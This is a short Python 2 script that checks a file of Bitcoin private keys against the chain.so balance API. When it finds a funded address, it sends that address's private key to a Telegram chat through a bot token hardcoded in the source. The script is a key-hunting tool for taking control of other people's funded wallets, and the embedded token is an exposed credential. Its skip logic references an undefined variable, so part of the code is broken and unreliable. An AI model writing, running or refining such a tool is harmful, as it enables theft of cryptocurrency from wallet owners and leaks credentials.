# -*- coding: utf-8 -*-

from bitcoin import *
import requests

BASE_URL = 'https://api.telegram.org/bot'
Token = '109206957:AAElM9hVB5AhkF9ojNZi2PlWYDFZdBUyXTQ' #ticker bot VERDE


def reply(msg,chat_id):
    
    url = BASE_URL + Token + '/sendMessage' 

    r = requests.post(url, data = { 
    'chat_id':chat_id ,'text': msg.encode('utf-8'),
    'disable_web_page_preview': 'true' , 'reply_to_message_id': '' 
        })
    return 

s = open('1M.txt','r').read().strip()
lines = s.split('\n')

linea = 0
lines_iter = iter(lines)
for line  in lines_iter:
    linea = linea + 1
    if (linea < 15000): next(line_iter)
    address = privtoaddr(line)
    url = "https://chain.so/api/v2/get_address_balance/BTC/" + address
    headers = {'Content-Type': 'application/json',
              'Accept-Encoding': 'gzip, deflate' ,
              'User-Agent': 'Ninguno' ,
              'Connection': 'keep-alive'}

    btc = 0

    r = requests.get(url,headers=headers)
   
    if r.status_code == 200:
        data=r.json()

        #print address, data

        btc = (float (data['data']['confirmed_balance']))
        
        #print btc
        sys.stdout.write('%s\r' % str(linea))
        sys.stdout.flush()

        if (btc > 0) :
            
            print line,btc
            msg = line
            chat_id = '6660201'
            reply(msg,chat_id)
            break
  

